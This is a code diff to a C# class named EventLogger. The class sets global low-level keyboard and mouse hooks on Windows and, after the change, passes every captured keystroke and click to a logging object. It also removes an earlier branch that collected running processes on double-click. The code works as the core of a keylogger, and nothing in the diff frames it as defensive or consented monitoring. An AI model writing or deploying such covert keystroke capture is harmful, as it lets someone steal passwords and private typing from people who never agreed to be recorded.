@@ -32,6 +32,7 @@ class EventLogger
     
     private static IntPtr _keyboardHook = IntPtr.Zero;
     private static IntPtr _mouseHook = IntPtr.Zero;
+    private static Logger logger = new Logger();
     
     private delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);
  
@@ -44,7 +45,6 @@ class EventLogger
         
         _keyboardHook = SetHandler(process.MainModule,(LowLevelProc)KeyBoardHandler, Utils.WH_KEYBOARD_LL);
         _mouseHook = SetHandler(process.MainModule, (LowLevelProc)MouseHandler,Utils.WH_MOUSE_LL);
-        
         Application.Run();
         
         UnhookWindowsHookEx(_keyboardHook);
@@ -56,26 +56,15 @@ class EventLogger
     {
         return SetWindowsHookEx(action, handler, GetModuleHandle(module.ModuleName), 0);
     }
-
-    private static DateTime previousTime = DateTime.Now;
+    
     private static IntPtr MouseHandler(int nCode, IntPtr wParam, IntPtr lParam)
     {
         if(wParam==(IntPtr)Utils.WM_LBUTTONDOWN)
         {
-            //check if previousTime and Datetime.Now is more than 500 milliseconds
-            if(DateTime.Now.Subtract(previousTime).TotalMilliseconds<=500)
-            {
-                Console.WriteLine("[Double-Mouse] Left button down");
-                Utils.CollectProcess(Process.GetProcesses());
-            }
-            else
-            {
-                Console.WriteLine("[Mouse] Left button down");
-            }
-            previousTime = DateTime.Now;
+            logger.MouseLog("[ML]"); // ML = Mouse Left
         }
         else if (wParam == (IntPtr)Utils.WM_RBUTTONDOWN) {
-            Console.WriteLine("[Mouse] Right button down");
+            logger.MouseLog("[MR]"); // MR = Mouse Right
         }
         return CallNextHookEx(_mouseHook, nCode, wParam, lParam);
     }
@@ -83,7 +72,7 @@ class EventLogger
     {
         //Keyboard event
         if (wParam == (IntPtr)Utils.WM_KEYDOWN || wParam!=(IntPtr)Utils.WM_KEYUP){
-            Utils.TransformInt((int)Marshal.ReadInt32(lParam));
+            logger.KeyLog(Utils.TransformInt((int)Marshal.ReadInt32(lParam)));
         }
         return CallNextHookEx(_keyboardHook, nCode, wParam, lParam);
     }
